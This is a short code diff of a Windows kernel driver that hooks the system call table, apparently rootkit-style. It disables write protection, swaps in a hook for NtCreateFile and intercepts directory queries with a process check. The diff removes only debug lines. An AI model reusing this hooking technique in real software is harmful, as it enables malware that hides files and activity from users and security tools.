@@ -89,7 +89,6 @@ VOID HookApis()
 
 		WPOFF();
 		DbgPrint("Hooking SSD table \n");
-        __asm int 3
 		// NtCreateFile
 		OrgNtCreateFile	= SYSCALL( g_ApiList.NtCreateFileIndex );
 		SYSCALL( g_ApiList.NtCreateFileIndex ) = HookNtCreateFile;
@@ -104,7 +103,6 @@ VOID HookApis()
 		// NtQueryDirectoryFile
 //		OrgNtQuerySystemInformation	= SYSCALL( g_ApiList.NtQuerySystemInformationIndex );
 //		SYSCALL( g_ApiList.NtQuerySystemInformationIndex ) = HookNtQuerySystemInformation;
-
 
 		gb_ApisHooked = TRUE;
 		WPON();
@@ -259,8 +257,6 @@ NTSTATUS NewZwQueryDirectoryFile(
 			bReturnOnlyOneEntry,
 			PathMask,
 			bRestartQuery);
-
-    DbgPrint("Jestem w srodku\n");
 
 	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
 	currentEprocess = PsGetCurrentProcess();
